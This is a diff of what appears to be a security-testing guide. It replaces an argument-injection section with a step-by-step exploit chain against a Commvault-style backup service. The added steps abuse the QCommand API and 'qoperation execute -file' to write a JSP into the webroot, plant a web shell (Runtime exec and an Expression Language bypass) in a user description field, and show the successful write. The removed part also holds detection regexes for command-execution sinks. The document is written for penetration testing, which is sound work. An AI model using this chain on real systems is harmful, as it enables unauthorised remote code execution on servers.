@@ -679,156 +679,169 @@ Decompile the application based on the programming language used
 {% endstep %}
 
 {% step %}
-In the service, find a feature that creates its own custom command-line interface (such as `cmd`)
+Look for a custom command-line interface (for example, `cmd`)
 {% endstep %}
 
 {% step %}
-Then identify the switches and commands in this command-line interface that are related to authentication
-{% endstep %}
-
-{% step %}
-In the code, find the authentication endpoint processing logic (like in the code below). Determine the request type and review the inputs it receives
+Review the API list and check whether any API directly communicates with the service’s custom command-line interface
 
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-[HttpPost("Login")]
-public IActionResult Login([FromBody] CheckCredentialReq req) // [1]
+[HttpPost("QCommand/{*command}")]
+public IActionResult QCommand(string command, [FromBody] [AllowNull] string req = "")
 {
-    CheckCredentialResp checkCredentialResp = new CheckCredentialResp();
-    this.ValidateLoginInput(req);
+    string reqXmlString = base.GetReqXmlString(req);
+    return this.Ok(new CVWebHandlerQAPI().Qcommand(reqXmlString, command));
+}
 
-    try
+[HttpPost("QCommand")]
+public IActionResult ExecuteQCommand([FromBody] string command)
+{
+    return this.Ok(new CVWebHandlerQAPI().Qcommand(null, command));
+}
+
+[HttpPost("ExecuteQCommand")]
+public IActionResult ExecuteQCommand2([FromBody] NameValueCollection data)
+{
+    string text = string.Empty;
+    string reqJson = string.Empty;
+    string reqXml = string.Empty;
+
+    if (data != null && data.Get("command") != null)
     {
-        var stopwatch = new Stopwatch();
-        stopwatch.Start();
-
-        checkCredentialResp = new AuthenticationCore().DoLogin(req); // [2]
-
-        stopwatch.Stop();
-        base.logger.LogInfo(
-            $"Total time taken to execute login: [{stopwatch.Elapsed.TotalSeconds:0.00}] second(s)",
-            "Login",
-            57
-        );
-    }
-    catch (Exception ex)
-    {
-        base.logger.LogError(ex.Message + " : " + ex.StackTrace, "Login", 61);
-        checkCredentialResp.errList = checkCredentialResp?.errList ?? new List<Error>();
-
-        if (checkCredentialResp.errList.Count == 0)
-        {
-            checkCredentialResp.errList.Add(new Error
-            {
-                errorCode = 500,
-                errLogMessage = "Internal server error."
-            });
-        }
+        text = data.Get("command");
     }
 
-    return this.Ok(checkCredentialResp);
+    if (data != null && data.Get("inputRequestXML") != null)
+    {
+        reqJson = data.Get("inputRequestXML");
+        reqXml = base.GetReqXmlString(reqJson);
+    }
+
+    if (string.IsNullOrEmpty(text))
+    {
+        throw new HandlerException(HandlerError.OperationNotSupported, -1, "Invalid input. Input request command  is required.", null, "ExecuteQCommand2", 63);
+    }
+
+    return this.Ok(new CVWebHandlerQAPI().Qcommand(reqXml, text));
 }
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```java
-@PostMapping("Login")
-public ResponseEntity<CheckCredentialResp> login(@RequestBody CheckCredentialReq req) { // [1]
+@PostMapping("QCommand/{command:.+}")
+public ResponseEntity<?> QCommand(@PathVariable String command, @RequestBody(required = false) String req) {
+    String reqXmlString = getReqXmlString(req);
+    return ResponseEntity.ok(new CVWebHandlerQAPI().Qcommand(reqXmlString, command));
+}
 
-    CheckCredentialResp checkCredentialResp = new CheckCredentialResp();
-    this.validateLoginInput(req);
+@PostMapping("QCommand")
+public ResponseEntity<?> ExecuteQCommand(@RequestBody String command) {
+    return ResponseEntity.ok(new CVWebHandlerQAPI().Qcommand(null, command));
+}
 
-    try {
-        long startTime = System.currentTimeMillis();
+@PostMapping("ExecuteQCommand")
+public ResponseEntity<?> ExecuteQCommand2(@RequestBody MultiValueMap<String, String> data) {
+    String text = "";
+    String reqJson = "";
+    String reqXml = "";
 
-        checkCredentialResp = new AuthenticationCore().doLogin(req); // [2]
-
-        long endTime = System.currentTimeMillis();
-        double elapsedSeconds = (endTime - startTime) / 1000.0;
-
-        logger.info(String.format("Total time taken to execute login: [%.2f] second(s)", elapsedSeconds));
-    } catch (Exception ex) {
-        logger.error(ex.getMessage() + " : " + Arrays.toString(ex.getStackTrace()));
-
-        if (checkCredentialResp == null || checkCredentialResp.getErrList() == null) {
-            checkCredentialResp.setErrList(new ArrayList<>());
-        }
-
-        if (checkCredentialResp.getErrList().isEmpty()) {
-            checkCredentialResp.getErrList().add(new Error(500, "Internal server error."));
-        }
+    if (data != null && data.getFirst("command") != null) {
+        text = data.getFirst("command");
     }
 
-    return ResponseEntity.ok(checkCredentialResp);
+    if (data != null && data.getFirst("inputRequestXML") != null) {
+        reqJson = data.getFirst("inputRequestXML");
+        reqXml = getReqXmlString(reqJson);
+    }
+
+    if (text.isEmpty()) {
+        throw new HandlerException(HandlerError.OperationNotSupported, -1, "Invalid input. Input request command is required.", null, "ExecuteQCommand2", 63);
+    }
+
+    return ResponseEntity.ok(new CVWebHandlerQAPI().Qcommand(reqXml, text));
 }
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```php
-public function login(CheckCredentialReq $req)
-{
-    $checkCredentialResp = new CheckCredentialResp();
-    $this->validateLoginInput($req);
+/**
+ * @Route("/QCommand/{command}", methods={"POST"})
+ */
+function QCommand($command, ?string $req = "") {
+    $reqXmlString = $this->getReqXmlString($req);
+    return $this->ok((new CVWebHandlerQAPI())->Qcommand($reqXmlString, $command));
+}
 
-    try {
-        $start = microtime(true);
+/**
+ * @Route("/QCommand", methods={"POST"})
+ */
+function ExecuteQCommand(string $command) {
+    return $this->ok((new CVWebHandlerQAPI())->Qcommand(null, $command));
+}
 
-        $checkCredentialResp = (new AuthenticationCore())->doLogin($req); // [2]
+/**
+ * @Route("/ExecuteQCommand", methods={"POST"})
+ */
+function ExecuteQCommand2(array $data) {
+    $text = "";
+    $reqJson = "";
+    $reqXml = "";
 
-        $end = microtime(true);
-        $elapsed = $end - $start;
-        $this->logger->info(sprintf("Total time taken to execute login: [%.2f] second(s)", $elapsed));
-    } catch (Exception $ex) {
-        $this->logger->error($ex->getMessage() . " : " . $ex->getTraceAsString());
-
-        if (!isset($checkCredentialResp->errList) || $checkCredentialResp->errList === null) {
-            $checkCredentialResp->errList = [];
-        }
-
-        if (count($checkCredentialResp->errList) === 0) {
-            $checkCredentialResp->errList[] = (object)[
-                'errorCode' => 500,
-                'errLogMessage' => 'Internal server error.'
-            ];
-        }
+    if (!empty($data['command'])) {
+        $text = $data['command'];
     }
 
-    return $this->ok($checkCredentialResp);
+    if (!empty($data['inputRequestXML'])) {
+        $reqJson = $data['inputRequestXML'];
+        $reqXml = $this->getReqXmlString($reqJson);
+    }
+
+    if (empty($text)) {
+        throw new HandlerException(HandlerError::OperationNotSupported, -1, "Invalid input. Input request command is required.", null, "ExecuteQCommand2", 63);
+    }
+
+    return $this->ok((new CVWebHandlerQAPI())->Qcommand($reqXml, $text));
 }
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```js
-router.post('/Login', async (req, res) => { // [1]
-    let checkCredentialResp = {};
+app.post("/QCommand/:command", (req, res) => {
+    let command = req.params.command;
+    let reqXmlString = getReqXmlString(req.body || "");
+    res.json(new CVWebHandlerQAPI().Qcommand(reqXmlString, command));
+});
 
-    try {
-        const start = Date.now();
+app.post("/QCommand", (req, res) => {
+    let command = req.body;
+    res.json(new CVWebHandlerQAPI().Qcommand(null, command));
+});
 
-        checkCredentialResp = await new AuthenticationCore().doLogin(req.body); // [2]
+app.post("/ExecuteQCommand", (req, res) => {
+    let data = req.body || {};
+    let text = "";
+    let reqJson = "";
+    let reqXml = "";
 
-        const elapsed = (Date.now() - start) / 1000;
-        logger.info(`Total time taken to execute login: [${elapsed.toFixed(2)}] second(s)`);
-    } catch (ex) {
-        logger.error(`${ex.message} : ${ex.stack}`);
-
-        if (!checkCredentialResp.errList) {
-            checkCredentialResp.errList = [];
-        }
-
-        if (checkCredentialResp.errList.length === 0) {
-            checkCredentialResp.errList.push({
-                errorCode: 500,
-                errLogMessage: "Internal server error."
-            });
-        }
+    if (data.command) {
+        text = data.command;
     }
 
-    res.json(checkCredentialResp);
+    if (data.inputRequestXML) {
+        reqJson = data.inputRequestXML;
+        reqXml = getReqXmlString(reqJson);
+    }
+
+    if (!text) {
+        throw new HandlerException(HandlerError.OperationNotSupported, -1, "Invalid input. Input request command is required.", null, "ExecuteQCommand2", 63);
+    }
+
+    res.json(new CVWebHandlerQAPI().Qcommand(reqXml, text));
 });
 ```
 {% endtab %}
@@ -836,467 +849,180 @@ router.post('/Login', async (req, res) => { // [1]
 {% endstep %}
 
 {% step %}
-Review the code flow and the used functions to check whether, under certain conditions, user input can be passed to the authentication switch in the command-line interface. (In this example, the authentication switch in the CLI is `QLogin`, which is used in line `[1]` in the code below
+In the documentation of the target service’s custom CLI, review the list of commands and check whether there is a command that performs an operational execution process (such as `qoperation execute`)
 
-{% tabs %}
-{% tab title="C#" %}
+```bash
+qoperation execute
+```
+{% endstep %}
+
+{% step %}
+Run the command in the CLI and use the `h-` switch for the target command to check which switches it supports
+
+```bash
+qoperation execute -h
+```
+{% endstep %}
+
+{% step %}
+Look for switches named `file-` that receive a file or export the output of a command
+
+```powershell
+Options:
+-cs    Commserver host name
+..[]..
+-h     Displays this help string
+-af    Reads xml input for job ids from a file
+..[]..
+-file    File Name where output is to be written
+```
+{% endstep %}
+
+{% step %}
+If the `file-` switch is used to store the output of a command, check whether you can control the file output path and specify the output type, like in the command below
+
+```bash
+qoperation execute -file F:\Program Files\Commvault\ContentStore\Apache\webapps\root\wat.jsp
+```
+{% endstep %}
+
+{% step %}
+At this stage, the output content must be controlled. Look for switches in the `qoperation execute` command that accept input and execute it. In this example, the `af-` switch places operations inside an XML file, passes it to the command, and executes it
+{% endstep %}
+
+{% step %}
+Extract the list of available operations, for example `App_GetUserPropertiesRequest`, which returns user properties and must be placed inside an XML file on the local system
+
+```xml
+<App_GetUserPropertiesRequest level="30">
+	<user userName="unk9vvn" />
+</App_GetUserPropertiesRequest>
+```
+{% endstep %}
+
+{% step %}
+After execution with the `af-` switch and providing the local path of the XML file containing the operation, the output file will contain the user properties
+
+```xml
+> qoperation execute -af C:\Users\Public\script.xml
+
+output :
+
+<App_GetUserPropertiesResponse>
+
+  <users UPN="" agePasswordDays="0" associatedExternalUserGroupsOperationType="ADD" associatedUserGroupsOperationType="ADD" authenticationMethod="LOCAL" companyName="Commcell" description="This is localadmin" edgeDriveQuotaLimitInGB="100" email="" enableUser="true" enforceEdgeDriveQuota="false" enforceFSQuota="false" fullName="WIN-AC7GJT5_localadmin__" idleTime="0" inheritGroupEdgeDriveQuotaSettings="true" inheritGroupQuotaSettings="true" isAccountLocked="false" istfaEnabled="false" lastLogIntime="1745939401" loggedInMode="2" quotaLimitInGB="100" removeOtherActiveSessions="true">
+    <userEntity userGUID="F52B43CB-26F8-4695-B0E8-94EC2F9DE0C9" userId="5" userName="WIN-AC7GJT5_localadmin__"/>
+    <LinkedCommvaultUser/>
+    <apiQuota APILimit="0" APItimeFrame="0"/>
+    <currentAuthenticator IdentityServerId="0" IdentityServerName="Commcell">
+      <ownerCompany domainName="Commcell" id="0"/>
+    </currentAuthenticator>
+  </users>
+
+</App_GetUserPropertiesResponse>
+```
+{% endstep %}
+
+{% step %}
+Then look for APIs that allow modifying user properties in a way that a JSP payload can be inserted. For example, the code below handles updating user properties
+
 ```csharp
-private bool DoRemoteCSLogin(CheckCredentialReq loginRequest, ref CheckCredentialResp loginResponse)
+[HttpPost("User/{*userId}")]
+public IActionResult UpdateUserProperties([FromBody] UpdateUserPropertiesRequest request, string userId)
 {
-    int num = 0;
-    string empty = string.Empty;
-    bool flag = !loginRequest.usernameFieldSpecified;
-    bool result;
-
-    if (flag)
-    {
-        base.logger.LogError("username is not specified. Invalid remote CS login.", "DoRemoteCSLogin", 2154);
-        this.FillLoginResponseWithError(ref loginResponse, num, empty, 1127, "unknown error", "");
-        result = false;
-    }
-    else
-    {
-        bool flag2 = !this.DecodePass(ref loginRequest, ref loginResponse);
-        if (flag2)
-        {
-            result = false;
-        }
-        else
-        {
-            loginRequest.username = this.GetFullUsername(loginRequest);
-            string commserverName = loginRequest.commserver.Split('*')[0];
-
-            string text;
-            string text2;
-            num = new QLogin().DoQlogin(loginRequest.commserver, loginRequest.username, loginRequest.password, out text, out text2, out empty, 5, false); // [1]
-
-            bool flag3 = num == 0;
-            if (flag3)
-            {
-                base.logger.LogTrace("Commcell login succeeded for user " + loginRequest.username + " for Commserver " + loginRequest.commserver, "DoRemoteCSLogin", 2175);
-
-                int value;
-                string text3;
-                num = new QLogin().GetQSDKUserInfo(commserverName, loginRequest.username, text, out value, out text3, out empty); // [2]
-
-                bool flag4 = num == 0;
-                if (flag4)
-                {
-                    // ...
-                }
-            }
-        }
-    }
-
-    return result;
+	string empty = string.Empty;
+	AppMsg.UserInfo userInfo = request.users[0];
+	if (userInfo.userEntity == null)
+	{
+		userInfo.userEntity = new UserEntity();
+	}
+	int userId2;
+	if (int.TryParse(userId, out userId2))
+	{
+		userInfo.userEntity.userId = userId2;
+	}
+	else
+	{
+		userInfo.userEntity.userName = base.GetConvertedUserEntity(userId).userName;
+	}
+	return this.Ok(this.UpdateUserProperties(request, this.LoggedInUserId, this.CurrentLocaleId));
 }
 ```
-{% endtab %}
-
-{% tab title="Java" %}
-```java
-private boolean doRemoteCSLogin(CheckCredentialReq loginRequest, CheckCredentialResp loginResponse) {
-    int num = 0;
-    String empty = "";
-    boolean result;
-
-    boolean flag = !loginRequest.isUsernameFieldSpecified();
-    if (flag) {
-        logger.error("username is not specified. Invalid remote CS login.");
-        fillLoginResponseWithError(loginResponse, num, empty, 1127, "unknown error", "");
-        result = false;
-    } else {
-        boolean flag2 = !decodePass(loginRequest, loginResponse);
-        if (flag2) {
-            result = false;
-        } else {
-            loginRequest.setUsername(getFullUsername(loginRequest));
-            String commserverName = loginRequest.getCommserver().split("\\*")[0];
-
-            String text;
-            String text2;
-            num = new QLogin().doQlogin(loginRequest.getCommserver(), loginRequest.getUsername(), loginRequest.getPassword(), out text, out text2, out empty, 5, false); // [1]
-
-            boolean flag3 = num == 0;
-            if (flag3) {
-                logger.trace("Commcell login succeeded for user " + loginRequest.getUsername() +
-                             " for Commserver " + loginRequest.getCommserver());
-
-                int value;
-                String text3;
-                num = new QLogin().getQSDKUserInfo(commserverName, loginRequest.getUsername(), text, out value, out text3, out empty); // [2]
-
-                boolean flag4 = num == 0;
-                if (flag4) {
-                    // ...
-                }
-            }
-        }
-    }
-
-    return result;
-}
-```
-{% endtab %}
-
-{% tab title="PHP" %}
-```php
-private function doRemoteCSLogin($loginRequest, &$loginResponse) {
-    $num = 0;
-    $empty = "";
-    $result = false;
-
-    $flag = !$loginRequest->usernameFieldSpecified;
-    if ($flag) {
-        $this->logger->error("username is not specified. Invalid remote CS login.");
-        $this->fillLoginResponseWithError($loginResponse, $num, $empty, 1127, "unknown error", "");
-        $result = false;
-    } else {
-        $flag2 = !$this->decodePass($loginRequest, $loginResponse);
-        if ($flag2) {
-            $result = false;
-        } else {
-            $loginRequest->username = $this->getFullUsername($loginRequest);
-            $commserverName = explode('*', $loginRequest->commserver)[0];
-
-            $text = null;
-            $text2 = null;
-            $num = (new QLogin())->doQlogin($loginRequest->commserver, $loginRequest->username, $loginRequest->password, $text, $text2, $empty, 5, false); // [1]
-
-            $flag3 = $num === 0;
-            if ($flag3) {
-                $this->logger->trace("Commcell login succeeded for user {$loginRequest->username} for Commserver {$loginRequest->commserver}");
-
-                $value = null;
-                $text3 = null;
-                $num = (new QLogin())->getQSDKUserInfo($commserverName, $loginRequest->username, $text, $value, $text3, $empty); // [2]
-
-                $flag4 = $num === 0;
-                if ($flag4) {
-                    // ...
-                }
-            }
-        }
-    }
-
-    return $result;
-}
-```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```js
-function doRemoteCSLogin(loginRequest, loginResponse) {
-    let num = 0;
-    let empty = "";
-    let result = false;
-
-    const flag = !loginRequest.usernameFieldSpecified;
-    if (flag) {
-        logger.error("username is not specified. Invalid remote CS login.");
-        fillLoginResponseWithError(loginResponse, num, empty, 1127, "unknown error", "");
-        result = false;
-    } else {
-        const flag2 = !decodePass(loginRequest, loginResponse);
-        if (flag2) {
-            result = false;
-        } else {
-            loginRequest.username = getFullUsername(loginRequest);
-            const commserverName = loginRequest.commserver.split('*')[0];
-
-            let text, text2;
-            num = (new QLogin()).doQlogin(loginRequest.commserver, loginRequest.username, loginRequest.password, (t, t2, e) => { text = t; text2 = t2; empty = e; }, 5, false); // [1]
-
-            const flag3 = num === 0;
-            if (flag3) {
-                logger.trace(`Commcell login succeeded for user ${loginRequest.username} for Commserver ${loginRequest.commserver}`);
-
-                let value, text3;
-                num = (new QLogin()).getQSDKUserInfo(commserverName, loginRequest.username, text, (v, t3, e) => { value = v; text3 = t3; empty = e; }); // [2]
-
-                const flag4 = num === 0;
-                if (flag4) {
-                    // ...
-                }
-            }
-        }
-    }
-
-    return result;
-}
-```
-{% endtab %}
-{% endtabs %}
 {% endstep %}
 
 {% step %}
-Enter the function and check whether the inputs and arguments used for `QLogin` are placed directly into command instructions. (In the example below, `commserver`, which is user input, is used as `text` and `text2` in the code above
+Add a user property that does not have strict character or length limitations, such as description or bio, and place the malicious payload inside that property in the API request
 
-**VSCode (Regex Detection)**
+```http
+POST /commandcenter/RestServlet/User/5 HTTP/1.1
+Host: example.com
+Accept: application/xml
+Authtoken: QSDK 3d4ab7f7def2...
+Content-Length: 270
 
-{% tabs %}
-{% tab title="C#" %}
-```regex
-(string\.Format\s*\()|(\$\s*".*-\w+\s*\{.*\}")|(Process(StartInfo)?\s*\()|(handleQAPIReq\s*\()|(Split\s*\(\s*['"].\*['"])
+<App_UpdateUserPropertiesRequest><users>
+<AppMsg.UserInfo>
+<userEntity>
+<userId>5</userId>
+</userEntity>
+<description>&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;</description>
+</AppMsg.UserInfo>
+</users></App_UpdateUserPropertiesRequest>
 ```
-{% endtab %}
-
-{% tab title="Java" %}
-```regex
-(String\.format\s*\()|(\$\s*".*-\w+\s*\{.*\}")|(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()
-```
-{% endtab %}
-
-{% tab title="PHP" %}
-```regex
-(sprintf\s*\()|(`.*\$\w+.*`)|(shell_exec\s*\()|(exec\s*\()|(system\s*\()
-```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```regex
-(exec\s*\()|(spawn\s*\()|(child_process)|(template\s*string\s*`.*-\w+\$\{.*\}`)
-```
-{% endtab %}
-{% endtabs %}
-
-**RipGrep (Regex Detection(Linux))**
-
-{% tabs %}
-{% tab title="C#" %}
-```regex
-string\.Format\s*\(|\$\s*".*-\w+\s*\{.*\}"|Process(StartInfo)?\s*\(|handleQAPIReq\s*\(|Split\s*\(\s*['"].\*['"]
-```
-{% endtab %}
-
-{% tab title="Java" %}
-```regex
-String\.format\s*\(|\$\s*".*-\w+\s*\{.*\}"|Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(
-```
-{% endtab %}
-
-{% tab title="PHP" %}
-```regex
-sprintf\s*\(|`.*\$\w+.*`|shell_exec\s*\(|exec\s*\(|system\s*\(
-```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```regex
-exec\s*\(|spawn\s*\(|child_process|`.*-\w+\$\{.*\}`
-```
-{% endtab %}
-{% endtabs %}
-
-**Vulnerable Code Pattern**
-
-{% tabs %}
-{% tab title="C#" %}
-```csharp
-internal int DoQlogin(string commserverName, string userName, string password, out string token, out string qsdkGuid, out string errorString, int samlTokenValidityInMins = 5, bool isCreateSamlTokenRequest = false)
-{
-    string[] array = commserverName.Split('*', StringSplitOptions.None);
-    string text = array[0];
-    string text2 = string.IsNullOrEmpty(this.csClientName) ? text : this.csClientName;
-    string text3;
-    errorString = text3 = string.Empty;
-    qsdkGuid = text3;
-    token = text3;
-
-    if (array.Length > 1)
-    {
-        text2 = array[1];
-    }
-
-    string commandParameters = string.Empty;
-
-    if (isCreateSamlTokenRequest)
-    {
-        commandParameters = string.Format("-cs {0} -csn {1} -getsamlToken -gt -u {2} -clp {3} -validformins {4} -featureType {5}",
-            text, text2, userName, password, samlTokenValidityInMins, this.SAMLTokenFeatureType); // [1]
-    }
-    else
-    {
-        commandParameters = string.Format(" -cs {0} -csn {1} -gt -u {2} -clp {3} ",
-            text, text2, userName, password); // [2]
-    }
-
-    string pinfoXML = QLogin.GetPInfoXML(0, string.Empty, 0,
-        Convert.ToInt32(QLogin.QCOMMANDS.QCOMMAND_LOGIN).ToString(),
-        Convert.ToInt32(QLogin.QAPI_OperationSubType.QQAPI_OPERATION_NOSUBCOMMAND).ToString(),
-        0U, commandParameters, commserverName, null, false, null); // [3]
-
-    string empty = string.Empty;
-    string empty2 = string.Empty;
-    int num = new QAPICommandCppSharp().handleQAPIReq(pinfoXML, empty, ref empty2); // [4]
-
-    if (num == 0)
-    {
-        token = empty2;
-        if (!isCreateSamlTokenRequest)
-        {
-            string xml = CVWebConf.GetDecryptedPassword(token);
-            QAllTokenInfo qallTokenInfo = new QAllTokenInfo();
-            XMLDecoder.ReadXml(xml, qallTokenInfo);
-            qsdkGuid = CVWebConf.decodePass(Convert.ToBase64String(qallTokenInfo.tokenInfo[0].guid));
-        }
-    }
-
-    return num;
-}
-```
-{% endtab %}
-
-{% tab title="Java" %}
-```java
-int doQlogin(String commserverName, String userName, String password, Holder<String> token, Holder<String> qsdkGuid, Holder<String> errorString, int samlTokenValidityInMins, boolean isCreateSamlTokenRequest) {
-    String[] array = commserverName.split("\\*");
-    String text = array[0];
-    String text2 = (this.csClientName == null || this.csClientName.isEmpty()) ? text : this.csClientName;
-    String text3 = "";
-    errorString.value = text3;
-    qsdkGuid.value = text3;
-    token.value = text3;
-
-    if (array.length > 1) {
-        text2 = array[1];
-    }
-
-    String commandParameters = "";
-    if (isCreateSamlTokenRequest) {
-        commandParameters = String.format("-cs %s -csn %s -getsamlToken -gt -u %s -clp %s -validformins %d -featureType %s",
-            text, text2, userName, password, samlTokenValidityInMins, this.SAMLTokenFeatureType); // [1]
-    } else {
-        commandParameters = String.format(" -cs %s -csn %s -gt -u %s -clp %s ", text, text2, userName, password); // [2]
-    }
-
-    String pinfoXML = QLogin.getPInfoXML(0, "", 0,
-        Integer.toString(QLogin.QCOMMANDS.QCOMMAND_LOGIN.ordinal()),
-        Integer.toString(QLogin.QAPI_OperationSubType.QQAPI_OPERATION_NOSUBCOMMAND.ordinal()),
-        0, commandParameters, commserverName, null, false, null); // [3]
-
-    String empty = "";
-    StringHolder empty2 = new StringHolder("");
-    int num = new QAPICommandCppSharp().handleQAPIReq(pinfoXML, empty, empty2); // [4]
-
-    if (num == 0) {
-        token.value = empty2.value;
-        if (!isCreateSamlTokenRequest) {
-            String xml = CVWebConf.getDecryptedPassword(token.value);
-            QAllTokenInfo qallTokenInfo = new QAllTokenInfo();
-            XMLDecoder.readXml(xml, qallTokenInfo);
-            qsdkGuid.value = CVWebConf.decodePass(Base64.getEncoder().encodeToString(qallTokenInfo.tokenInfo[0].guid));
-        }
-    }
-
-    return num;
-}
-```
-{% endtab %}
-
-{% tab title="PHP" %}
-```php
-function doQlogin($commserverName, $userName, $password, &$token, &$qsdkGuid, &$errorString, $samlTokenValidityInMins = 5, $isCreateSamlTokenRequest = false) {
-    $array = explode('*', $commserverName);
-    $text = $array[0];
-    $text2 = empty($this->csClientName) ? $text : $this->csClientName;
-    $text3 = "";
-    $errorString = $text3;
-    $qsdkGuid = $text3;
-    $token = $text3;
-
-    if (count($array) > 1) {
-        $text2 = $array[1];
-    }
-
-    if ($isCreateSamlTokenRequest) {
-        $commandParameters = sprintf("-cs %s -csn %s -getsamlToken -gt -u %s -clp %s -validformins %d -featureType %s",
-            $text, $text2, $userName, $password, $samlTokenValidityInMins, $this->SAMLTokenFeatureType); // [1]
-    } else {
-        $commandParameters = sprintf(" -cs %s -csn %s -gt -u %s -clp %s ", $text, $text2, $userName, $password); // [2]
-    }
-
-    $pinfoXML = QLogin::getPInfoXML(0, "", 0, strval(QLogin::QCOMMANDS['QCOMMAND_LOGIN']), strval(QLogin::QAPI_OperationSubType['QQAPI_OPERATION_NOSUBCOMMAND']), 0, $commandParameters, $commserverName, null, false, null); // [3]
-
-    $empty = "";
-    $empty2 = "";
-    $num = (new QAPICommandCppSharp())->handleQAPIReq($pinfoXML, $empty, $empty2); // [4]
-
-    if ($num === 0) {
-        $token = $empty2;
-        if (!$isCreateSamlTokenRequest) {
-            $xml = CVWebConf::getDecryptedPassword($token);
-            $qallTokenInfo = new QAllTokenInfo();
-            XMLDecoder::readXml($xml, $qallTokenInfo);
-            $qsdkGuid = CVWebConf::decodePass(base64_encode($qallTokenInfo->tokenInfo[0]->guid));
-        }
-    }
-
-    return $num;
-}
-```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```js
-function doQlogin(commserverName, userName, password, callback, samlTokenValidityInMins = 5, isCreateSamlTokenRequest = false) {
-    let array = commserverName.split('*');
-    let text = array[0];
-    let text2 = !this.csClientName ? text : this.csClientName;
-    let token = "";
-    let qsdkGuid = "";
-    let errorString = "";
-
-    if (array.length > 1) {
-        text2 = array[1];
-    }
-
-    let commandParameters = "";
-    if (isCreateSamlTokenRequest) {
-        commandParameters = `-cs ${text} -csn ${text2} -getsamlToken -gt -u ${userName} -clp ${password} -validformins ${samlTokenValidityInMins} -featureType ${this.SAMLTokenFeatureType}`; // [1]
-    } else {
-        commandParameters = ` -cs ${text} -csn ${text2} -gt -u ${userName} -clp ${password} `; // [2]
-    }
-
-    let pinfoXML = QLogin.getPInfoXML(0, "", 0, QLogin.QCOMMANDS.QCOMMAND_LOGIN.toString(),
-        QLogin.QAPI_OperationSubType.QQAPI_OPERATION_NOSUBCOMMAND.toString(),
-        0, commandParameters, commserverName, null, false, null); // [3]
-
-    let empty = "";
-    let empty2 = "";
-    let num = new QAPICommandCppSharp().handleQAPIReq(pinfoXML, empty, (res) => { empty2 = res; }); // [4]
-
-    if (num === 0) {
-        token = empty2;
-        if (!isCreateSamlTokenRequest) {
-            let xml = CVWebConf.getDecryptedPassword(token);
-            let qallTokenInfo = new QAllTokenInfo();
-            XMLDecoder.readXml(xml, qallTokenInfo);
-            qsdkGuid = CVWebConf.decodePass(Buffer.from(qallTokenInfo.tokenInfo[0].guid).toString('base64'));
-        }
-    }
-
-    return num;
-}
-```
-{% endtab %}
-{% endtabs %}
 {% endstep %}
 
 {% step %}
-After reaching `QLogin`, which performs authentication commands, review the CLI switches responsible for authentication and check whether there is a switch or feature related to admin access or obtaining a valid admin token (such as `localadmin-`)
+If, after executing the command, the characters `“` and `>` in the `wT-poc.jsp` output file are HTML-encoded and this breaks the shell execution
+
+```
+qoperation execute -af F:\Program Files\Commvault\ContentStore\Reports\MetricsUpload\Upload\ABC1234\rekt.xml -file F:\Program Files\Commvault\ContentStore\Apache\webapps\ROOT\wT-poc.jsp
+```
+
+Instead of using the characters `“` and `>` directly, use JSP Expression Language (EL) in Java to bypass HTML encoding and execute the shell code
+
+```http
+POST /commandcenter/RestServlet/User/5 HTTP/1.1
+Host: example.com
+Accept: application/xml
+Authtoken: QSDK 3db346462...
+Content-type: application/xml
+Content-Length: 333
+
+<App_UpdateUserPropertiesRequest><users>
+<AppMsg.UserInfo>
+<userEntity>
+<userId>5</userId>
+</userEntity>
+<description>${pageContext.servletContext.getClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec(param.cmd)}
+</description>
+</AppMsg.UserInfo>
+</users></App_UpdateUserPropertiesRequest>
+```
 {% endstep %}
 
 {% step %}
-First, test with a low-privilege or local user to see whether this feature works and grants a high-level role or token. If not, review the CLI processor and check whether it uses `dotnet.exe`, since this processor may run with `SYSTEM-level` privileges
+Then resend your request to the server’s custom CLI API
+
+```http
+POST /commandcenter/RestServlet/QCommand HTTP/1.1
+Host: example.com
+Authtoken: QSDK 3db346462c1de...
+Content-type: text/plain
+Content-Length: 185
+
+qoperation execute -af F:\Program Files\Commvault\ContentStore\Reports\MetricsUpload\Upload\ABC1234\rekt.xml -file F:\Program Files\Commvault\ContentStore\Apache\webapps\ROOT\wT-poc.jsp
+```
 {% endstep %}
 
 {% step %}
-Due to improper input validation and sanitization of user-supplied arguments in the CLI, it may be possible to inject the desired switch into a user-controlled parameter (such as the Password field) and send the request
-{% endstep %}
+If the server responds with the expected result, the vulnerability is confirmed
 
-{% step %}
-If you encounter issues obtaining the admin username or related information, review the database to identify the admin username and then resend the request
+```http
+HTTP/1.1 200 
+...
+
+Operation Successful.Results written to [F:\Program Files\Commvault\ContentStore\Apache\webapps\ROOT\wT-poc.jsp].
+```
 {% endstep %}
 {% endstepper %}
 
